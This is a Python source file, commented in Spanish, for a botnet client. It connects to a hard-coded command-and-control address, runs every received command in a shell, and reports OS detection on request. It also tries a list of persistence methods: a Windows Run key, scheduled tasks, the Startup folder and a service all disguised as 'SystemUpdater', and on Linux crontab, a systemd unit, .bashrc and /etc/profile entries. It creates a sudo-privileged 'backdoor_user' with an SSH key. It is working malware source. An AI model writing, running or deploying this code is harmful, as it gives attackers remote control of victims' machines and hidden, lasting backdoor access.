import socket
import subprocess
import platform

HOST = "172.31.128.167"
PORT = 9999

def detectar_sistema():
    
    """
    Detecta el sistema operativo del bot.

    Usa la función platform.system() para determinar el sistema operativo
    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
    """
    return platform.system().lower()  # "windows" o "linux"

def conectar_a_CnC():
    
    """
    Establece una conexión del bot al servidor de Comando y Control (C&C).

    Crea un socket TCP/IP y se conecta al servidor C&C usando la dirección
    y puerto especificados por las variables HOST y PORT. Devuelve el socket
    conectado para permitir la comunicación con el servidor.

    :return: El socket conectado al servidor C&C.
    """

    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((HOST, PORT))
    print(f"Conectado al servidor C&C {HOST}:{PORT}")
    return bot

# Función para esperar órdenes del servidor C&C
def intentar_persistencia():

    """
    Intenta establecer persistencia en el sistema operativo del bot.

    Dependiendo del sistema operativo detectado, ejecuta una serie de comandos
    que intentan asegurar la persistencia del bot en el sistema. En Windows,
    utiliza métodos como el registro, tareas programadas y servicios. En Linux,
    emplea crontab, systemd y modificaciones en archivos de inicio. Si alguno
    de los métodos tiene éxito, se detiene el proceso y devuelve un mensaje
    indicando el método exitoso. Si todos fallan, devuelve un mensaje de error.

    :return: Un mensaje indicando si se logró la persistencia o un error.
    :rtype: str
    """

    so = detectar_sistema()
    persistencia_exitosa = False
    mensaje_final = "[ERROR] No se pudo establecer persistencia"

    if so == "windows":
        comandos = [
                # 1. Registro de Windows
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdater /t REG_SZ /d "%APPDATA%\\clienteinfectado.exe" /f',
                # 2. Tarea Programada
                'schtasks /create /tn "SystemUpdater" /tr "%APPDATA%\\clienteinfectado.exe" /sc ONLOGON /rl HIGHEST',
                # 3. Carpeta de Inicio
                'copy %APPDATA%\\clienteinfectado.exe %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdater.exe',
                # 4. Servicio de Windows
                'sc create SystemUpdater binPath= "%APPDATA%\\clienteinfectado.exe" start= auto',
                # 5. WMI Events (requiere admin)
                'powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName "SystemUpdater" -Action (New-ScheduledTaskAction -Execute "%APPDATA%\\clienteinfectado.exe")'
            ]

    elif so == "linux":
        comandos = [
            # 1. Crontab
            "(crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -",
            # 2. Systemd Service
            """echo '[Unit]
                Description=Bot Persistente
                After=network.target

                [Service]
                ExecStart=/usr/bin/python3 ~/clienteinfectado.py
                Restart=always
                User=$USER

                [Install]
                WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service""",
            # 3. Modificación de ~/.bashrc
            "echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc",
            # 4. Modificación de /etc/profile (requiere root)
            "sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile'",
            # 5. Crear usuario SSH con clave autorizada
            "sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user",
            "mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys",
            "chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh"
        ]

    else:
        return mensaje_final  # Sistema no reconocido

    for cmd in comandos:
        try:
            resultado = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if resultado.returncode == 0:
                persistencia_exitosa = True
                mensaje_final = f"[OK] Persistencia establecida con: {cmd.split()[0]}"
                break  # Detener el intento tras el primer éxito
        except Exception:
            continue  # Si un método falla, probar el siguiente

    return mensaje_final


def esperar_ordenes(bot):
    
    """
    Espera órdenes del servidor C&C y las ejecuta.

    Este bucle infinito espera recibir órdenes del servidor C&C y las
    ejecuta en el sistema operativo del bot. Si el comando es "detect_os",
    devuelve el resultado de detectar_sistema(). Si el comando es "persistencia",
    intenta establecer persistencia en el sistema y devuelve el resultado.
    Para cualquier otro comando, lo ejecuta en el sistema y devuelve la
    salida del comando o un mensaje de error si ocurre un error.

    :param bot: El socket conectado al servidor C&C.
    :type bot: socket.socket
    """
    while True:
        try:
            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
            if not orden:
                continue
            
            print(f"Comando recibido: {orden}")

            if orden == "detect_os":
                bot.send(detectar_sistema().encode("utf-8"))
                continue
            elif orden == "persistencia":
                resultado = intentar_persistencia().encode("utf-8")
            else:
                resultado = ejecutar_comando(orden)

            bot.send(resultado if resultado else b"Comando ejecutado sin salida")

        except Exception as e:
            print(f"Error: {e}")
            break

def ejecutar_comando(orden):
    
    """
    Ejecuta un comando del sistema operativo recibido como cadena.

    Usa subprocess para ejecutar el comando proporcionado y captura su salida.
    Si el comando se ejecuta correctamente, devuelve la salida. Si ocurre un 
    error durante la ejecución, captura la salida de error y la devuelve 
    como mensaje de error.

    :param orden: Comando del sistema a ejecutar.
    :return: Salida del comando o mensaje de error en caso de fallo.
    """

    try:
        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8') # Devolver el error

def ejecutar_bot():
    
    """
    Función principal que conecta el bot al servidor C&C y espera órdenes.

    Establece la conexión con el servidor de Comando y Control (C&C) usando
    la función conectar_a_CnC y luego entra en un bucle para recibir y
    procesar órdenes mediante la función esperar_ordenes.

    :return: None
    """

    bot = conectar_a_CnC() # Conectar al servidor C&C
    esperar_ordenes(bot) # Esperar y procesar órdenes


if __name__ == "__main__":
    ejecutar_bot() # Ejecutar el bot